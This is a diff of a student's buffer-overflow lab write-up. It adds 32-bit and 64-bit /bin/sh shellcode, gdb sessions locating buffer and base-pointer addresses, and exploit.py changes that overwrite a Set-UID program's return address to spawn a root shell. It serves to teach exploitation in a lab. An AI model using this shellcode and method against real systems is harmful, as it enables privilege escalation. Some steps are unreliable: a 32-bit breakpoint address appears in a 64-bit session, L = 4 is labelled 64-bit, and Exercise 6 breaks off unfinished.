@@ -52,7 +52,7 @@ If we make `/Lab7/exercise1/a32.out` and `/Lab7/exercise1/a64.out` root-owned Se
 
 ## Exercise 2: Understanding the Vulnerable Program
 
-The vulnerable program used in this lab is `/Lab7/exercise2/stack.c`. This program has a buffer-overflow vulnerability, and your job is to exploit this vulnerability and gain the root privilege. 
+The vulnerable program used in this lab is `/Lab7/exercise2/stack.c`. This program has a buffer-overflow vulnerability, and your job is to exploit this vulnerability and gain root privileges. 
 
 ```c
 include <stdlib.h>
@@ -131,7 +131,6 @@ To exploit the buffer-overflow vulnerability in the target program, we need to p
 We will utilize the `/Lab7/exercise3/exploit.py` program for this purpose. We will start with the base Python script provided in the lab setup and make the following modifications:
 
 ```python
-# Place the shellcode towards the end of the buffer
 shellcode= (
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
     "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
@@ -182,12 +181,9 @@ $1 = (char (*)[160]) 0xffffce60
 
 ![attacks](/Lab7/exercise4/img/1.png)
 
-We will utilize the `/Lab7/4/exploit.py` program for this purpose. We will start with the base Python script provided in the lab setup and make the following modifications:
-
-
+We will utilize the `/Lab7/exercise4/exploit.py` program in order to do the attack. We will start with the base Python script provided in the lab setup and make the following modifications:
 
 ```python
-# Place the shellcode towards the end of the buffer
 shellcode= (
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
     "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
@@ -210,3 +206,112 @@ We use the spraying technique to construct the first `ret` bytes of the buffer, 
 The loop iterates 50 times because we know that the buffer size is in the range of 100 to 200 bytes, and on a 32-bit architecture, each memory address occupies 4 bytes. Therefore, dividing the upper bound of the buffer range (200 bytes) by the size of each memory address (4 bytes) gives us 50 iterations. Additionally, we use `offset*L` as the initial index and `offset*L + L` as the final index to ensure that we align with memory boundaries, as values stored in the frame pointer are always multiples of four due to memory alignment considerations. 
 
 ![attacks](/Lab7/exercise4/img/2.png)
+
+## Exercise 5: Launching Attack on 64-bit Program (Level 3)
+
+To do the attack we use `gdb` to find the buffer and edp addres:
+```bash
+[04/06/24]seed@VM:~/.../ex5$ gdb stack-L3-dbg 
+gdb-peda$ b bof
+Breakpoint 1 at 0x80484c1: file stack.c, line 18.
+gdb-peda$ run
+...
+Breakpoint 1, bof (...) at stack.c:14
+14	{
+gdb-peda$ next
+...
+18	    strcpy(buffer, str); 
+gdb-peda$ p &buffer
+$1 = (char (*)[200]) 0x7fffffffdce0
+gdb-peda$ p $rbp
+$2 = (void *) 0x7fffffffddb0
+```
+
+Now we know that:
+- buffer = 0x7fffffffdce0
+- rbp = 0x7fffffffddb0
+- ret = buffer + start
+- offset = rbp - buffer + 8
+
+![attacks](/Lab7/exercise5/img/1.png)
+
+Notice that use `p $rbp` instead of `p $edp` to access the base pointer register because we are workink on 64-bit architecture. For the same reaseon we add 8 instead of 4 to the offset.
+
+The address you've chosen (buffer + start) does not contain zero bytes in the middle and thus is being copied correctly onto the stack.
+
+The interval of `start` that I found effective ranges from 97 to 162. Initially, I started with 120 (as suggested by the book), then fine-tuned it through trial and error tests, centered around the initial value of 120.
+
+We will utilize the `/Lab7/exercise5/exploit.py` program in order to do the attack. We will start with the base Python script provided in the lab setup and make the following modifications:
+
+```python
+# Shell code for 64-bit
+shellcode= (
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+).encode('latin-1')
+
+# Put the shellcode somewhere in the payload
+start = 120            # It works for（97，162）
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value and put it somewhere in the payload
+buffer = 0x7fffffffdce0
+rbp = 0x7fffffffddb0
+ret    = buffer + start         
+offset = rbp - buffer + 8  
+
+# 64-bit architecture
+L = 4
+
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+```
+
+![attacks](/Lab7/exercise5/img/2.png)
+
+## Exercise 6: Task 6: Launching Attack on 64-bit Program (Level 4)
+
+The target program (stack-L4) in this task is similar to the one in the Level 2, except that the buffer size is extremely small. We set the buffer size to 10, while in Level 2, the buffer size is much larger. Your goal is the same: get the root shell by attacking this Set-UID program. 
+
+
+To do the attack we use `gdb` to find the buffer and edp addres:
+```bash
+[04/06/24]seed@VM:~/.../ex6$ gdb stack-L4-dbg 
+gdb-peda$ b bof
+Breakpoint 1 at 0x11a9: file stack.c, line 14.
+gdb-peda$ run
+...
+Breakpoint 1, bof (...) at stack.c:14
+14	{
+gdb-peda$ next
+...
+18	    strcpy(buffer, str); 
+gdb-peda$ p $rbp
+$1 = (void *) 0x7fffffffd990
+gdb-peda$ p &buffer
+$2 = (char (*)[10]) 0x7fffffffd986
+```
+
+Due to the calculated buffer space being too small, it cannot accommodate the shellcode (which is 30 bytes in size). Therefore, the buffer in the bof function cannot be used here. Consequently, we redirect our attention to the `str` variable in the main function, which also stores the content of the shellcode. Therefore, we need to set the return address (`ret`) in the buffer to point to the shellcode within the `str` variable. It's important to note that breakpoints need to be reset because `str` is passed as a pointer to a pointer,
+
+```bash
+[04/06/24]seed@VM:~/.../ex6$ gdb stack-L4-dbg 
+gdb-peda$ b main
+Breakpoint 1 at 0x11a9: file stack.c, line 14.
+gdb-peda$ run
+...
+Breakpoint 1, main (argc=0x0, argv=0x0) at stack.c:26
+26	{
+gdb-peda$ p &str
+$1 = (char (*)[517]) 0x7fffffffddc0
+```
+
+Now we know that:
+- buffer = 0x7fffffffd986
+- str = 0x7fffffffddc0
+- rbp = 0x7fffffffd990
+- offset = rbp - str + 8
+
+0x7fffffffd990 - 0x7fffffffd986
+
+The goal is to set the buffer's ret to the shellcode stored in str and then execute it. This is necessary because the calculated buffer space is too small to hold the shellcode. The buffer's size is only 10, while the shellcode's size is also 30. Therefore, it is not possible to use the buffer for this task. Instead, the shellcode must be executed from the main function's str. To achieve this, a new breakpoint must be set because str is passed as a pointer to a pointer. 
